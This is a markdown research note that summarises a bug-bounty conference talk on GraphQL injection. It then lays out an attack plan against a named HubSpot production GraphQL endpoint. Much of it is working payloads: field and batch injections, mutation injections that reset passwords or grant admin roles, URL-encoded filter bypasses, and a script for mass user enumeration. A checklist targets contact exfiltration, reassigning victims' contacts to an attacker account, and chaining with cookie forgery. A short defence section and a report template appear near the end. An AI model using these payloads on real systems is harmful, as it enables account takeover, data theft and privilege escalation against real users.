# GraphQL Injection Methodology
## From Jasmine Landré (JRock17) - NahamCon 2025

**Source**: https://www.youtube.com/watch?v=TKIBrRwFys0
**Speaker**: Jasmine Landré (JRock17)
**Experience**: 400+ bugs reported, full-time bug bounty hunter, 7 years pentester
**Date Extracted**: 2025-10-23

**Critical for HubSpot**: We have a GraphQL endpoint at `https://app-na2.hubspot.com/api/graphql/crm`

---

## Speaker Background

- **Name**: Jasmine Landré (JRock17)
- **Bug Bounty**: 400+ reported bugs, full-time hunter for 9 months
- **Previous**: 13 years IT security, 7 years pentester, NASDAQ senior director
- **Severity**: Most GraphQL injection bugs found were HIGH severity
- **Platforms**: All major bug bounty platforms (HackerOne, Bugcrowd, etc.)
- **Focus**: AppSec, web applications, GraphQL vulnerabilities

---

## What is GraphQL Injection?

### Definition
GraphQL injection happens when **unsanitized user input is passed directly into a backend GraphQL query or mutation**, allowing attackers to inject arbitrary GraphQL operations.

### Comparison to SQL Injection
```
SQL Injection:
User input → SQL query → Database

GraphQL Injection:
User input → GraphQL query → GraphQL API → Data access
```

**Key Difference**: With GraphQL, you're injecting into the query language itself, not just parameters.

---

## Why GraphQL Injection Matters

### Common But Underreported
- "Not extremely common, but I've found it maybe 5 times max" - JRock
- Hard to identify because GraphQL endpoints are often hidden
- Not limited to just `/graphql` - can be `/api`, custom routes, etc.
- Many apps have MULTIPLE GraphQL endpoints

### Impact Potential
- **Information Disclosure** - Access to fields you shouldn't see
- **Broken Access Control** - Access to admin-only data
- **IDOR** - Access to other users' data
- **Account Takeover** - Password resets, privilege escalation
- **Mass Assignment** - Modify fields that should be read-only
- **Path Traversal** - In some contexts
- **SSRF** - Depending on backend implementation
- **XXS/CSRF** - Secondary vulnerabilities
- **Denial of Service** - Complex queries crashing backend

---

## GraphQL Basics (Refresher)

### Queries vs Mutations
```graphql
# QUERY - Read data (like GET)
query {
  user(id: 123) {
    id
    email
  }
}

# MUTATION - Change data (like POST/PUT/DELETE)
mutation {
  updatePassword(id: 123, newPassword: "test") {
    success
  }
}
```

### Key GraphQL Features
- **Introspection**: Can query the schema itself to see all types/fields
- **Batch Queries**: Multiple operations in one request
- **Alias Queries**: Run same query multiple times with different params
- **Client-Driven**: Client decides what fields to return

---

## Identifying GraphQL Endpoints

### 1. Look for GraphQL Indicators

**Error Messages**:
```
Field 'password' does not exist on type 'User'
Cannot query field "admin" on type "User"
```

**Endpoint Names**:
- `/graphql`
- `/api/graphql`
- `/graphql/api`
- `/v1/graphql`
- Any `/api/*` endpoint might be GraphQL

**Request Patterns**:
```json
POST /api/users
{
  "query": "query { ... }",
  "variables": { ... },
  "operationName": "GetUser"
}
```

### 2. Test for Introspection

**Introspection Query**:
```graphql
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
    mutationType {
      name
      fields {
        name
        description
      }
    }
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}
```

**What You Get**:
- All available queries
- All available mutations
- All types and their fields
- Field descriptions (sometimes revealing sensitive info)

**If introspection is enabled** → You have a complete map of the API ✅

---

## GraphQL Injection Attack Patterns

### Pattern 1: Direct Query Injection

**Vulnerable Code** (Backend):
```javascript
// VULNERABLE - User input directly in GraphQL query
const query = `
  query {
    user(id: ${userId}) {
      id
      email
    }
  }
`;
```

**Attack**:
```
Normal input: 123
Injected: 123) { id email password } admin:user(id:1
```

**Resulting Query**:
```graphql
query {
  user(id: 123) {
    id
    email
    password  # ← Injected!
  }
  admin:user(id:1) {  # ← New query added!
    id
    email
    password
  }
}
```

### Pattern 2: Batch Query Injection

**What is Batch Querying?**
GraphQL allows multiple operations in one request:

```graphql
query {
  q1: user(id: 1) { email }
  q2: user(id: 2) { email }
  q3: user(id: 3) { email }
}
```

**Injection Technique**:
```
# Vulnerable endpoint: /api/users?id=123

Normal: /api/users?id=123
Injected: /api/users?id=123) { email } q2:user(id:1
```

**Resulting Query**:
```graphql
query {
  user(id: 123) {
    email
  }
  q2:user(id:1) {  # ← Injected batch query
    email
    password      # Can add any field
    accessLevel
  }
}
```

**Use Case**: Brute force user IDs or enumerate all users

### Pattern 3: Field Injection

**Goal**: Access fields that aren't returned by default

**Technique**:
```
# URL: /api/user?fields=id,email
# Backend builds: user { id email }

Inject: id,email,password,accessLevel,admin

Resulting query:
user {
  id
  email
  password      # ← Injected!
  accessLevel   # ← Injected!
  admin         # ← Injected!
}
```

**How to Find Hidden Fields**:
1. Run introspection to see all fields on User type
2. Try injecting fields that exist but aren't normally shown
3. Common hidden fields: `password`, `accessLevel`, `role`, `admin`, `isAdmin`, `permissions`

### Pattern 4: Type Confusion / String vs Integer

**Vulnerable Pattern**:
```javascript
// Backend expects integer ID
query {
  user(id: 123) { email }
}

// But ID field is defined as String in schema
```

**Injection**:
```
Normal: id=123
Inject: id="123") { email password } allUsers {
```

**Result**: Can break out of quotes to inject additional queries

### Pattern 5: Alias Query Injection

**What are Aliases?**
```graphql
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}
```

**Injection for IDOR Brute Force**:
```graphql
query {
  user1: user(id: 1) { id email password }
  user2: user(id: 2) { id email password }
  user3: user(id: 3) { id email password }
  # ... repeat for user4 - user1000
}
```

**Impact**: Mass enumerate all users in one request

### Pattern 6: Mutation Injection

**Even More Dangerous** - Can change data, not just read it

**Vulnerable Code**:
```javascript
mutation {
  updateUser(id: ${userId}, email: "${newEmail}") {
    success
  }
}
```

**Injection**:
```
newEmail: test@test.com") { success } } mutation { updatePassword(id:1, newPassword:"hacked
```

**Resulting Query**:
```graphql
mutation {
  updateUser(id: 123, email: "test@test.com") {
    success
  }
}
mutation {
  updatePassword(id:1, newPassword:"hacked") {  # ← Injected mutation!
    success
  }
}
```

**Impact**: Account takeover, privilege escalation

---

## Advanced Techniques

### 1. Using URL Encoding to Bypass Filters

**Problem**: Special characters blocked

**Solution**: URL encode the injection

```
# Instead of: id=123) { email
# Use: id=123%29%20%7B%20email
```

**From video**: "Adding a URL encoded hashtag to close out the remaining part of the query"

### 2. Comment Injection to Close Queries

```graphql
# Inject: 123) { password } #

Becomes:
query {
  user(id: 123) {
    password
  } # original query commented out
}
```

### 3. Fragment Injection

**GraphQL Fragments**:
```graphql
fragment userFields on User {
  id
  email
  password
}

query {
  user(id: 123) {
    ...userFields
  }
}
```

**Injection**: Try to inject custom fragments to access more data

### 4. Subscription Injection

**GraphQL Subscriptions** (WebSocket-based real-time updates):
```graphql
subscription {
  userUpdated(id: 123) {
    email
    password  # Try to inject sensitive fields
  }
}
```

### 5. Named Operations Injection

```graphql
query GetUser($id: ID!) {
  user(id: $id) {
    email
  }
}
```

**Variables Sent Separately**:
```json
{
  "operationName": "GetUser",
  "variables": { "id": "123" },
  "query": "query GetUser($id: ID!) { ... }"
}
```

**Injection Points**:
- `operationName` - Try injecting second operation name
- `variables` - If not properly validated
- `query` - If client can modify the query string

---

## Testing Methodology

### Step 1: Identify GraphQL Usage

**Check Network Tab**:
```
Look for:
- POST requests to /graphql or /api/*
- Request body with "query", "variables", "operationName"
- Response with "data" and "errors" structure
```

**Test Basic Query**:
```graphql
{ __typename }
```

**If response is**:
```json
{ "data": { "__typename": "Query" } }
```

→ **It's GraphQL** ✅

### Step 2: Enable Introspection

**Try Introspection Query** (see above)

**If Blocked**:
- "Introspection disabled" error → Common in production
- Try anyway in case it's only partially blocked

**If Enabled**:
- Download full schema
- Identify all queries, mutations, types, fields
- Look for sensitive fields: `password`, `admin`, `secret`, `internal`, etc.

### Step 3: Test for Injection

**Basic Tests**:

```graphql
# 1. Add single quote
id: 123'

# Expected: Syntax error if vulnerable

# 2. Try closing parenthesis
id: 123)

# Expected: Different error or behavior

# 3. Try adding field
id: 123) { email password

# Expected: Access to password field if vulnerable

# 4. Try batch query
id: 123) { email } q2:user(id:1

# Expected: Response with both q1 and q2 data
```

### Step 4: Field Brute-Forcing

**Common Sensitive Fields to Test**:
```
password
passwordHash
accessLevel
role
admin
isAdmin
permissions
token
apiKey
secret
secretKey
internalId
userId
```

**Technique**:
```graphql
query {
  user(id: 123) {
    id
    email
    password      # Try this
    admin         # Try this
    accessLevel   # Try this
    # ... keep adding fields from introspection
  }
}
```

### Step 5: IDOR via Batch/Alias Queries

**If you can inject batch queries**:

```graphql
query {
  user1: user(id: 1) { id email }
  user2: user(id: 2) { id email }
  user3: user(id: 3) { id email }
  # ... up to user1000
}
```

**Automate**:
```python
query = "query {\n"
for i in range(1, 1000):
    query += f"  user{i}: user(id: {i}) {{ id email }}\n"
query += "}"
```

### Step 6: Test Mutations

**If mutations are accessible**:

```graphql
# Test if you can update other users
mutation {
  updateUser(id: 1, role: "admin") {
    success
  }
}

# Test password reset
mutation {
  updatePassword(id: 1, newPassword: "hacked") {
    success
  }
}
```

---

## HubSpot-Specific Application

### What We Know About HubSpot GraphQL

From previous research:
- ✅ **Endpoint**: `https://app-na2.hubspot.com/api/graphql/crm`
- ✅ **Introspection Enabled**: 777 types discovered
- ✅ **50 Query Operations**: All enumerated
- ✅ **52 Mutation Operations**: All enumerated
- ✅ **Schema**: Complete schema extracted
- ⚠️ **Authorization**: Already found issues with low-priv executing high-priv queries (false positive, but pattern exists)

### HubSpot GraphQL Injection Attack Plan

#### Test 1: Introspection-Based Field Injection

**What We Have**:
```graphql
# Known query: CrmObjectsSearchQuery
query CrmObjectsSearchQuery(
  $objectTypeId: String!
  $properties: [String!]
) {
  crmObjectsSearch(objectTypeId: $objectTypeId, properties: $properties) {
    results {
      id
      properties { name value }
    }
  }
}
```

**Test**: Can we inject additional fields?

```graphql
# Normal properties array:
["email", "firstname", "lastname"]

# Injected:
["email", "firstname", "lastname"] } sensitiveField:allContacts { password
```

**Goal**: Access fields not normally returned

#### Test 2: Batch Query IDOR

**Normal Request**:
```graphql
query {
  contact(id: "12345") {
    email
  }
}
```

**Injected**:
```graphql
query {
  c1: contact(id: "1") { email }
  c2: contact(id: "2") { email }
  c3: contact(id: "3") { email }
  # ... enumerate all contacts
}
```

**Impact**: Mass contact exfiltration

#### Test 3: Mutation Injection for Privilege Escalation

**From Schema**: We know there are 52 mutations

**Test Mutations**:
```graphql
mutation {
  updateCrmObjectProperties(
    objectId: "VICTIM_CONTACT_ID"
    properties: { hubspot_owner_id: "ATTACKER_ID" }
  ) {
    success
  }
}
```

**Injection Goal**: Assign victim's contacts to attacker's account

#### Test 4: Query Substitution (From False Positive Report)

**Remember**: Low-priv could execute `CrmObjectsSearchQuery`

**New Test**: Can we INJECT into this?

```
# URL parameter or variable injection
operationName=CrmObjectsSearchQuery") { results { password } } adminQuery:users(role:"admin
```

**Goal**: Chain query substitution with injection for critical impact

#### Test 5: Variable Injection

**HubSpot sends**:
```json
{
  "operationName": "CrmObjectsSearchQuery",
  "variables": {
    "objectTypeId": "0-1",
    "properties": ["email", "firstname"]
  },
  "query": "query CrmObjectsSearchQuery($objectTypeId: String!, $properties: [String!]) { ... }"
}
```

**Test if `objectTypeId` or `properties` are injectable**:

```json
{
  "variables": {
    "objectTypeId": "0-1\") { id } admin:allUsers(role:\"admin",
    "properties": ["email"]
  }
}
```

---

## Testing Checklist for HubSpot GraphQL

### Phase 1: Reconnaissance
- [x] Introspection enabled (DONE - 777 types found)
- [x] Schema downloaded (DONE)
- [x] All queries enumerated (DONE - 50 queries)
- [x] All mutations enumerated (DONE - 52 mutations)
- [ ] Identify sensitive fields in schema
- [ ] Map all query operations to their purposes
- [ ] Map all mutation operations to their purposes

### Phase 2: Basic Injection Tests
- [ ] Test single quote in variables → `"id": "123'"`
- [ ] Test closing parenthesis → `"id": "123)"`
- [ ] Test adding fields → `"id": "123) { sensitiveField"`
- [ ] Test batch query injection → `"id": "123) { } q2:contact(id:1"`
- [ ] Test mutation injection
- [ ] Test URL encoding bypass
- [ ] Test comment injection with `#`

### Phase 3: Field Enumeration
- [ ] Extract all Contact fields from schema
- [ ] Test injecting each hidden field
- [ ] Test admin-only fields (from schema introspection)
- [ ] Test internal fields (hs_*, internal_*)
- [ ] Document which fields are accessible

### Phase 4: IDOR Testing
- [ ] Test batch query for contact enumeration
- [ ] Test alias query for company enumeration
- [ ] Test cross-portal access (different portalIds)
- [ ] Test cross-user access (different hubspot_owner_ids)
- [ ] Automate enumeration if successful

### Phase 5: Mutation Testing
- [ ] Test updateCrmObjectProperties mutation
- [ ] Test deleteCrmObjectAssociation mutation
- [ ] Test any user/account mutations
- [ ] Test privilege escalation via mutations
- [ ] Test account takeover scenarios

### Phase 6: Advanced Attacks
- [ ] Combine injection with cookie counterfeiting
- [ ] Test injection in error messages (for XSS)
- [ ] Test SSRF via GraphQL (if backend fetches data)
- [ ] Test DoS via complex nested queries

---

## Payloads Reference

### Basic Syntax Test Payloads
```graphql
# 1. Single quote
'

# 2. Double quote
"

# 3. Closing parenthesis
)

# 4. Closing brace
}

# 5. Hash/comment
#

# 6. Newline
\n
```

### Field Injection Payloads
```graphql
# Add password field
) { password }

# Add multiple fields
) { password admin accessLevel }

# Add nested fields
) { password user { admin } }
```

### Batch Query Payloads
```graphql
# Simple batch
) { email } q2:user(id:1) { email

# With alias
) { email } admin:user(id:1) { password

# Mass enumeration
) { } u1:user(id:1){email} u2:user(id:2){email} ... u1000:user(id:1000){email}
```

### Mutation Injection Payloads
```graphql
# Update password
") { success } } mutation { updatePassword(id:1, password:"hacked

# Change role
") { success } } mutation { updateRole(id:1, role:"admin

# Account takeover
") { } } mutation { resetPassword(email:"victim@example.com", newPassword:"hacked
```

### URL Encoding Bypass
```
# ) { password }
%29%20%7B%20password%20%7D

# admin
%61%64%6D%69%6E

# mutation
%6D%75%74%61%74%69%6F%6E
```

---

## Tools for GraphQL Testing

### 1. GraphQL IDE/Clients
- **GraphQL Playground** - In-browser IDE
- **Insomnia** - REST/GraphQL client
- **Postman** - Supports GraphQL
- **Altair** - GraphQL client

### 2. Automated Scanners
- **InQL** - Burp Suite extension for GraphQL
- **GraphQL Cop** - Security auditor
- **CrackQL** - GraphQL password brute-forcing
- **GraphQLmap** - Scripting engine for GraphQL

### 3. Custom Scripts
```python
# Batch query generator
def generate_batch_query(query_name, param_name, start, end):
    query = "query {\n"
    for i in range(start, end):
        query += f"  result{i}: {query_name}({param_name}: {i}) {{ id email }}\n"
    query += "}"
    return query

# Usage
print(generate_batch_query("user", "id", 1, 100))
```

---

## Detection & Defense

### How to Prevent GraphQL Injection

**1. Use Variables (NOT string concatenation)**
```javascript
// ❌ BAD - Vulnerable
const query = `query { user(id: ${userId}) { email } }`;

// ✅ GOOD - Safe
const query = `query($id: ID!) { user(id: $id) { email } }`;
const variables = { id: userId };
```

**2. Validate Input Types**
```javascript
// Define strict types in schema
type Query {
  user(id: ID!): User  # ID type is validated
}
```

**3. Disable Introspection in Production**
```javascript
const server = new ApolloServer({
  introspection: process.env.NODE_ENV !== 'production'
});
```

**4. Implement Query Complexity Limits**
```javascript
const server = new ApolloServer({
  validationRules: [depthLimit(5), createComplexityLimitRule(1000)]
});
```

**5. Field-Level Authorization**
```javascript
// Only return password to admin users
password: (parent, args, context) => {
  if (!context.user.isAdmin) throw new Error("Unauthorized");
  return parent.password;
}
```

---

## Bug Bounty Report Template

```markdown
# GraphQL Injection Leading to [IMPACT]

## Summary
GraphQL injection vulnerability in [endpoint] allows attackers to
inject arbitrary GraphQL queries, leading to [information disclosure/
account takeover/privilege escalation].

## Steps to Reproduce

1. Navigate to: [URL]
2. Intercept request in Burp Suite
3. Inject payload: `[payload]`
4. Observe response containing [sensitive data]

## Proof of Concept

**Normal Request**:
```graphql
[normal query]
```

**Injected Request**:
```graphql
[malicious query]
```

**Response**:
```json
[showing sensitive data]
```

## Impact

- Information Disclosure: [details]
- Broken Access Control: [details]
- [Other impacts]

## Affected Endpoints

- [List all affected endpoints]

## CVSS Score

[Calculate based on impact]

## Remediation

1. Use parameterized queries with variables
2. Validate all input types
3. Implement field-level authorization
4. Disable introspection in production
5. Add query complexity limits

## References

- GraphQL Security Best Practices: https://graphql.org/learn/authorization/
- OWASP GraphQL Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html
```

---

## Key Takeaways

**From Jasmine (JRock17)**:

1. **"Not extremely common, but found it 5 times"** - Rare but high impact
2. **"All were high severity"** - GraphQL injection gets paid well
3. **"Hard to identify"** - Many researchers miss it
4. **"Keep in mind it's not always /graphql"** - Check all API endpoints
5. **"Introspection gives you the full map"** - Use it to find hidden fields
6. **"Batch queries for mass enumeration"** - One request, 1000 users
7. **"Test for mutations too"** - Not just queries
8. **"Context matters"** - Impact depends on what you can access

**For HubSpot Research**:

1. **We have the schema** - 777 types, 50 queries, 52 mutations
2. **We have the endpoint** - Already identified and tested
3. **We need to test injection** - Haven't tried injection payloads yet
4. **High impact potential** - Contact data exfiltration, privilege escalation
5. **Combine with cookie counterfeiting** - Ultimate attack chain

---

## Next Actions for HubSpot

### Immediate (This Week):
1. ✅ Extract schema (DONE)
2. 📝 Identify sensitive fields in schema
3. 🧪 Test basic injection payloads
4. 🧪 Test batch query injection
5. 🧪 Test field injection

### Short-Term (Next Week):
1. Test all 52 mutations for injection
2. Automate IDOR testing if injection works
3. Combine GraphQL injection + Cookie counterfeiting
4. Document findings

### Goal:
**Turn GraphQL introspection (info disclosure) + GraphQL injection + Cookie counterfeiting = CRITICAL finding worth $$$$**

---

**This is gold for HubSpot. We have everything we need to test this properly.**
